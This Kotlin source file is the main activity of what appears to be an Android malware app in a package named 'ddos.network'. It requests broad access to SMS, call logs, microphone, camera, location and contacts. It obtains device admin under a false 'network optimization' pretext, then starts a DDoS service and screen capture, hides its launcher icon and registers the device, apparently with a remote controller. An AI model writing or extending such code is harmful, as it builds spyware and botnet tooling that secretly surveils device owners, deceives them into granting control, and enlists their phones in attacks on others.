package com.ddos.network

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.Toast
import androidx.core.app.ActivityCompat

class MainActivity : Activity() {

    private val PERM_REQUEST = 1001
    private val ADMIN_REQUEST = 1002
    private val SCREENSHOT_REQUEST = 1003

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btn = findViewById<Button>(R.id.btn_activate)
        btn.setOnClickListener {
            startFullPermissions()
        }
    }

    private fun startFullPermissions() {
        val perms = mutableListOf<String>()

        // Media
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(android.Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        // SMS & Calls
        perms.add(android.Manifest.permission.READ_SMS)
        perms.add(android.Manifest.permission.RECEIVE_SMS)
        perms.add(android.Manifest.permission.READ_PHONE_STATE)
        perms.add(android.Manifest.permission.READ_CALL_LOG)
        perms.add(android.Manifest.permission.RECORD_AUDIO)
        perms.add(android.Manifest.permission.PROCESS_OUTGOING_CALLS)

        // Location
        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
        perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION)

        // Camera
        perms.add(android.Manifest.permission.CAMERA)

        // Contacts
        perms.add(android.Manifest.permission.READ_CONTACTS)

        ActivityCompat.requestPermissions(this, perms.toTypedArray(), PERM_REQUEST)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERM_REQUEST) {
            requestBattery()
            requestUsageStats()
            requestDeviceAdmin()
            requestNotificationAccess()
            requestAccessibility()
        }
    }

    private fun requestBattery() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }

    private fun requestUsageStats() {
        if (!hasUsageStatsPermission()) {
            val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(intent)
        }
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = getSystemService(APP_OPS_SERVICE) as android.app.AppOpsManager
        val mode = appOps.checkOpNoThrow(
            android.app.AppOpsManager.OPSTR_GET_USAGE_STATS,
            android.os.Process.myUid(), packageName
        )
        return mode == android.app.AppOpsManager.MODE_ALLOWED
    }

    private fun requestDeviceAdmin() {
        val compName = ComponentName(this, DeviceAdmin::class.java)
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager

        if (!dpm.isAdminActive(compName)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, compName)
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Network optimization requires admin access")
            startActivityForResult(intent, ADMIN_REQUEST)
        } else {
            activateStealth()
        }
    }

    private fun requestNotificationAccess() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
        startActivity(intent)
    }

    private fun requestAccessibility() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        when (requestCode) {
            ADMIN_REQUEST -> activateStealth()
            SCREENSHOT_REQUEST -> {
                val intent = Intent(this, ScreenshotService::class.java)
                intent.putExtra("resultCode", resultCode)
                intent.putExtra("data", data)
                startService(intent)
                finishAndHide()
            }
        }
    }

    private fun activateStealth() {
        val serviceIntent = Intent(this, DdosService::class.java)
        if (Build.VERSION.SDK_INT >= 26) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }

        val screenshotIntent = Intent(this, ScreenshotService::class.java)
        screenshotIntent.putExtra("request", true)
        startActivityForResult(createScreenshotIntent(), SCREENSHOT_REQUEST)
    }

    private fun createScreenshotIntent(): Intent {
        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager
        return manager.createScreenCaptureIntent()
    }

    private fun finishAndHide() {
        IconHider.hide(this)
        DeviceRegistrar.register(this)
        Toast.makeText(this, "DDOS Network Activated", Toast.LENGTH_SHORT).show()
        finish()
    }
}
